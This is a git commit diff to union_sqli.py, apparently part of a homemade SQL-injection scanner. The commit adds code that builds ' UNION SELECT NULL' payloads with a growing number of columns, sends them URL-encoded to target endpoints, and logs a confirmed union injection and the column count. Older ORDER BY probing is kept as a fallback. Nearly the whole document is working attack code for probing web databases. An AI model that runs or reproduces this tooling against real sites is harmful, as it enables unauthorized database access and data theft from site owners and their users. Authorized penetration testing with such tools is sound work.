b4e0c5e72c22ea85b187b1da8f32f9bd7639d421
s0m3body <pisdushko1886@gmail.com>
2024-12-03 21:09:01 +0300

    Changes: 1) union_sqli.py now supports both ORDER BY and UNION SELECT NULL    injections

--- SQLi/src/SQLi/union_sqli.py
+++ SQLi/src/SQLi/union_sqli.py
@@ -2,10 +2,11 @@ import requests
 
 from utils.auxiliary import *
 
+log = Auxiliary(__name__)
+log.set_config()
+
 
 def try_order_by_sqli(url, options: list):
-    log = Auxiliary(__name__)
-    log.set_config()
     vuln_endpoints = options[0]
     db_comment = options[1]
     index = 1
@@ -21,8 +22,47 @@ def try_order_by_sqli(url, options: list):
             else:
                 log.logger.info(f"{GREEN}[+]{RESET} Confirmed union SQLi "
                                 f"on endpoint {url + endp + pld}")
-                break
+                log.logger.info(f"{BLUE}[*]{RESET} Number of columns "
+                                f"returned is {index - 1}")
+                return index - 1
+
+
+def generate_null_pld(db_comment, index):
+    base_pld = "' UNION SELECT NULL"
+    # If we have first payload return it
+    if index == 1:
+        return base_pld + db_comment
+    # Otherwise we add NULLs
+    else:
+        for i in range(0, index):
+            base_pld += ", NULL"
+        base_pld += db_comment
+    return base_pld
+
+
+
+def try_null_sqli(url, options: list):
+    vuln_endpoints = options[0]
+    db_comment = options[1]
+    index = 1
+    for endp in vuln_endpoints:
+        while True:
+            pld = generate_null_pld(db_comment, index)
+            pld = requests.utils.quote(pld)
+            r = requests.get(url=url + endp + pld)
+            log.logger.info(f"{BLUE}[*]{RESET} Trying union SQLi "
+                            f"on endpoint {url + endp + pld}")
+            if r.status_code == 500:
+                index += 1
+            else:
+                log.logger.info(f"{GREEN}[+]{RESET} Confirmed union SQLi "
+                                f"on endpoint {url + endp + pld}")
+                log.logger.info(f"{BLUE}[*]{RESET} Number of columns "
+                                f"returned is {index + 1}")
+                return index + 1
 
 
 def try_union_sqli(url, options: list):
-    try_order_by_sqli(url, options)
+    columns = try_null_sqli(url, options)
+    if not columns:
+        try_order_by_sqli(url, options)
